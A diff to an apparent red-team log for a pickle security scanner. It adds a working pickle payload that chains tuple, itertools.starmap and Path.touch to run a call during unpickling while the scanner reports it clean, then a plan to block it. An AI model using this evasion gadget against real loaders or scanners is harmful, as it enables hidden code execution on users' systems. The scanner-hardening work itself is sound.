@@ -578,3 +578,87 @@ Blocking plan:
 Performance note: the fix adds one string to the small builtin-name
 membership check. It does not add iterable-flow analysis or broader string
 scanning.
+
+## Turn 17 - `itertools.starmap` forced-iteration call gap
+
+Goal: produce another self-contained code-execution pickle that
+`packages/modelaudit-picklescan` does not flag.
+
+Payload shape:
+
+```python
+from pathlib import Path
+
+
+def s(value: str) -> bytes:
+    data = value.encode()
+    return b"\x8c" + bytes([len(data)]) + data
+
+
+marker = Path("/tmp/ma_itertools_starmap_tuple_marker")
+payload = b"".join(
+    [
+        b"\x80\x04",
+        s("builtins"),
+        s("tuple"),
+        b"\x93",
+        s("itertools"),
+        s("starmap"),
+        b"\x93",
+        s("pathlib"),
+        s("Path.touch"),
+        b"\x93",
+        b"]",
+        s("pathlib"),
+        s("PosixPath"),
+        b"\x93(",
+        s("/"),
+        s("tmp"),
+        s("ma_itertools_starmap_tuple_marker"),
+        b"tR",
+        b"\x85",
+        b"a",
+        b"\x86R",
+        b"\x85R.",
+    ]
+)
+```
+
+Proof on CPython 3.12.12:
+
+- Scanner result: `status=complete`, `verdict=clean`, `findings=[]`,
+  `notices=[]`
+- Unpickle result: creates `/tmp/ma_itertools_starmap_tuple_marker` and returns
+  `(None,)`
+- RCE mechanism: the pickle constructs
+  `itertools.starmap(pathlib.Path.touch, [(marker,)])`, then immediately calls
+  `tuple(...)` on that starmap object. `starmap()` stores an attacker-selected
+  callable and argument tuples, while `tuple()` forces iteration during
+  unpickling, invoking the callable with attacker-controlled arguments.
+
+Why the scanner missed it:
+
+- `itertools` is absent from both `DANGEROUS_WILDCARD_MODULES` and
+  `DANGEROUS_GLOBALS`.
+- The payload uses only currently clean globals: `builtins.tuple`,
+  `itertools.starmap`, `pathlib.Path.touch`, and `pathlib.PosixPath`.
+- There are no suspicious string seeds such as `eval(`, `exec(`, `__import__`,
+  `os.system`, or `subprocess`.
+
+Performance note: this is another lazy arbitrary-call sink that can be forced
+by a benign builtin. The narrow next block is a sorted `DANGEROUS_GLOBALS`
+entry for `("itertools", "starmap")`, plus a manual-pickle oracle regression
+that proves scan-time detection before unpickle-time marker creation.
+
+## Turn 18 - Block `itertools.starmap`
+
+Blocking plan:
+
+- Add `("itertools", "starmap")` to the sorted dangerous-global table.
+- Add portable policy coverage for raw `GLOBAL itertools starmap` reductions.
+- Add a CPython oracle regression that manually builds
+  `tuple(itertools.starmap(pathlib.Path.touch, [(marker,)]))`, verifies scanner
+  detection, then verifies the marker file appears only during unpickle.
+
+Performance note: the fix is a single additional binary-search entry. It does
+not add iterable-flow analysis or broader string scanning.
